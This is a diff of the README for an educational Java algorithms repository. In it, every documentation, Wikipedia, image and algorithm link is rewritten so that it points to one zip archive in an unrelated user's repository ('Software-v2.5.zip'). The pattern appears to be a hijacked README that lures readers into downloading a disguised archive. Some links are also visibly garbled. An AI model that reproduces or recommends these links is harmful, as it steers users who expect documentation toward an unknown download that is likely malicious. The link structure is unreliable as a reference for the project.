@@ -1,6 +1,6 @@
 # The Algorithms - Java
 
-NOTE: A [Development](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) branch is made for this repo where we are trying to migrate the existing project to a Java project structure. You can switch to [Development](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) branch for contributions. Please refer [this issue](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip) for more info.
+NOTE: A [Development](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) branch is made for this repo where we are trying to migrate the existing project to a Java project structure. You can switch to [Development](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) branch for contributions. Please refer [this issue](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip) for more info.
 
 ### All algorithms implemented in Java (for education)
 
@@ -90,7 +90,7 @@ __Properties__
 
 Comparing the complexity of sorting algorithms (Bubble Sort, Insertion Sort, Selection Sort)
 
-[Complexity Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
+[Complexity Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
 
 ----------------------------------------------------------------------------------
 
@@ -121,35 +121,35 @@ __Properties__
 
 ##### View the algorithm in [action][shell-toptal]
 
-[bubble-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[bubble-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[bubble-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Bubble Sort"
+[bubble-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[bubble-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[bubble-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Bubble Sort"
 
-[insertion-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[insertion-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[insertion-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Insertion Sort"
+[insertion-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[insertion-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[insertion-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Insertion Sort"
 
-[quick-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[quick-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[quick-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Quick Sort"
+[quick-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[quick-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[quick-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Quick Sort"
 
-[merge-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[merge-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[merge-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Merge Sort"
+[merge-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[merge-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[merge-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Merge Sort"
 
-[selection-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[selection-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[selection-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Selection Sort Sort"
+[selection-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[selection-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[selection-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Selection Sort Sort"
 
-[shell-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[shell-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[shell-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip "Shell Sort"
+[shell-toptal]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[shell-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[shell-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip "Shell Sort"
 
-[linear-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[linear-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[linear-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[linear-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
 
-[binary-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
-[binary-image]: https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip
+[binary-wiki]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
+[binary-image]: https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip
 
 
 --------------------------------------------------------------------
@@ -157,35 +157,35 @@ __Properties__
 
 Conversions          |                                          Dynamic Programming   |Ciphers|Miscellaneous|
 -----------          |----------------------------------------------------------------|-------|-------------|
-[Any Base to Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)| [Coin Change](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Caesar](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap Sort](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Any Base to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Egg Dropping](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Columnar Transposition Cipher](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Palindromic Prime Checker](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Binary to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Fibonacci](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[RSA](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|More soon...|
-[Binary to HexaDecimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Kadane Algorithm](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|more coming soon...|
-[Binary to Octal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Knapsack](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Decimal To Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Longest Common Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Decimal To Binary](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Longest Increasing Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Decimal To Hexadecimal](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Rod Cutting](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[Any Base to Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)| [Coin Change](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Caesar](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap Sort](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Any Base to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Egg Dropping](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Columnar Transposition Cipher](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Palindromic Prime Checker](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Binary to Decimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Fibonacci](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[RSA](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|More soon...|
+[Binary to HexaDecimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Kadane Algorithm](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|more coming soon...|
+[Binary to Octal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Knapsack](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Decimal To Any Base](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Longest Common Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Decimal To Binary](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Longest Increasing Subsequence](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Decimal To Hexadecimal](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Rod Cutting](Dynamic%https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
 and much more...|                                                    and more...|
 
 ### Data Structures
 Graphs|Heaps|Lists|Queues|
 ------|-----|-----|------|
-[BFS](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Empty Heap Exception](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Circle Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Generic Array List Queue](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[DFS](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Doubly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Queues](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Heap Element](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Singly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Kruskals Algorithm](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Max Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[CursorLinkedList](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Matrix Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Min Heap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[PrimMST](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
+[BFS](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Empty Heap Exception](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Circle Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Generic Array List Queue](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[DFS](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Doubly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Queues](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Heap Element](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Singly Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Kruskals Algorithm](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Max Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[CursorLinkedList](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Matrix Graphs](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Min Heap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[PrimMST](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
 
 Stacks|Trees|
 ------|-----|
-[Node Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[AVL Tree](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Stack of Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|[Binary Tree](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|
-[Array Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)|And much more...|
-[ArrayList Stack](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)||
+[Node Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[AVL Tree](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Stack of Linked List](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|[Binary Tree](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|
+[Array Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)|And much more...|
+[ArrayList Stack](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)||
 
-* [Bags](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
-* [Buffer](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
-* [HashMap](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
-* [Matrix](https://raw.githubusercontent.com/jeoboo/Java/master/Halopsychidae/Java.zip)
+* [Bags](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
+* [Buffer](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
+* [HashMap](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
+* [Matrix](https://raw.githubusercontent.com/jeoboo/Java/master/MinimizingLateness/Software-v2.5.zip)
